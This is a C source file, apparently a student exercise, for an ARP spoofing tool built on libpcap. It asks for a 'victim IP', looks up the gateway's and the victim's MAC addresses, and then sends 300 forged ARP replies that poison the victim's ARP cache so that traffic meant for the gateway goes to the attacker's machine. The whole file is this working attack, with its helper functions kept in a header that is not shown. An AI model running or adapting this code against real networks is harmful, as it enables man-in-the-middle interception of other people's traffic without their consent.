#include "header.h"

int main(int argc, char *argv[]){
	pcap_if_t *alldevs, *d;
	uint32_t inum, i = 0;
	uint8_t errbuf[PCAP_ERRBUF_SIZE];

	// Check the validity of the command line
	if (argc != 2) {
		printf("Usage: %s <victim IP>\n", argv[0]);
		exit(1);
	}
	// Retrieve the device list on the local machine
	if (pcap_findalldevs(&alldevs, errbuf) == -1) {
		perror(errbuf);
		exit(1);
	}

	// Print the list
	for (d = alldevs; d; d = d->next) {
		printf("%d. %s", ++i, d->name);
		if (d->description)
			printf(" (%s)\n", d->description);
		else
			printf(" (No description available)\n");
	}
	if (i == 0) {
		perror("\nNo interfaces found!\n");
		exit(1);
	}

	printf("Enter the interface number (1-%d): ", i);
	scanf("%d", &inum);
	if (inum < 1 || inum > i) {
		perror("\nInterface number out of range\n");
		// Free the device list
		pcap_freealldevs(alldevs);
		exit(1);
	}

	// Jump to the selected adapter
	for(d=alldevs, i=0; i< inum-1 ;d=d->next, i++);

	// Open the output device
	pcap_t *fp;
	fp = pcap_open_live(d->name, 65536, 0, 1000, errbuf);
	if (fp == NULL) {
		perror(errbuf);
		exit(1);
	}
	printf("\n");

	// Declare interface, data
	uint8_t *interface = (uint8_t *)malloc(strlen(d->name));
	memcpy(interface, d->name, strlen(d->name));
	pcap_freealldevs(alldevs);
	struct data_ip_host data;

	// Get my ip, my mac
	get_my_ip_host(interface, &data.my_ip, data.my_host);
	printf(" My IP:       ");
	addr_print((uint8_t *)&data.my_ip.s_addr, IP_ADDR_LEN);
	printf(" My MAC:      ");
	addr_print(data.my_host, ETHER_ADDR_LEN);

	// Get gateway ip, victim ip
	get_gateway_ip(interface, &data.gateway_ip);
	inet_pton(AF_INET, argv[1], &data.victim_ip.s_addr);
	printf(" Gateway IP:  ");
	addr_print((uint8_t *)&data.gateway_ip.s_addr, IP_ADDR_LEN);
	printf(" Victim IP:   ");
	addr_print((uint8_t *)&data.victim_ip.s_addr, IP_ADDR_LEN);

	// Declare ARP packet: 60bytess
	uint8_t packet[ETH_ARP_PAD_H] = { 0 };
	struct eth_arp_hdr *pkt = (struct eth_arp_hdr *)packet;
	init_arp_packet(pkt, &data);

	// Get gateway mac
	set_arp_packet(pkt, &data.gateway_ip, &data.my_ip, NULL, ARPOP_REQUEST);
	send_arp_packet(fp, packet);
	recv_arp_packet(fp, data.gateway_host, data.my_host, ARPOP_REPLY);
	printf(" Gateway MAC: ");
	addr_print(data.gateway_host, ETHER_ADDR_LEN);

	// Get victim mac 
	set_arp_packet(pkt, &data.victim_ip, &data.my_ip, NULL, ARPOP_REQUEST);
	send_arp_packet(fp, packet);
	recv_arp_packet(fp, data.victim_host, data.my_host, ARPOP_REPLY);
	printf(" Victim MAC:  ");
	addr_print(data.victim_host, ETHER_ADDR_LEN);

	// Test
	/*
	const uint8_t victim_host_test[ETHER_ADDR_LEN] = { 0x00, 0x22, 0x44, 0x66, 0x88, 0xaa };
	memcpy(data.victim_host, data.gateway_host, ETHER_ADDR_LEN);
	printf(" Victim MAC:  ");
	addr_print(data.victim_host, ETHER_ADDR_LEN);
	*/
	
	printf("\nStart ARP spoofing...\n");
	for (i = 0; i < 300; i++) {
		set_arp_packet(pkt, &data.victim_ip, &data.gateway_ip, data.victim_host, ARPOP_REPLY);
		send_arp_packet(fp, packet);
		usleep(SEC / 5);
	}
	printf("Complete forwarding %d packets.\n", i);

	printf("\nGood Bye~ *^^*\n");
	return 0;
}

